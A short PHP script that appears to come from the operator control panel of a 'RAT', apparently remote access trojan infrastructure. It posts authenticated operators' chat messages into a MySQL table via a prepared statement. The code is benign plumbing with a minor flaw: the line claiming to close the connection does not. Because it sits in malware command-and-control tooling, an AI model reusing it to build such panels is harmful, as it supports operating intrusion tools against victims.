<?php
  # Necessary at the top of every page for session management
  session_start();

  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));

    # Gets the current date and time in UTC
    # This will be used as a timestamp for the chat message
    $date = gmdate("Y-m-d H:i:s");

    # Inserts the date, user, and message into the "chat" table
    $statement = $dbConnection->prepare("INSERT INTO chat (date, user, message) VALUES (:date, :user, :message)");
    $statement->bindValue(":date", $date);
    $statement->bindValue(":user", $_SESSION["username"]);
    $statement->bindValue(":message", $_POST["message"]);
    $statement->execute();
    
    # Kills database connection
    $statement->connection = null;

    # Redirects back to index.php
    header("Location: index.php");
  }
?>
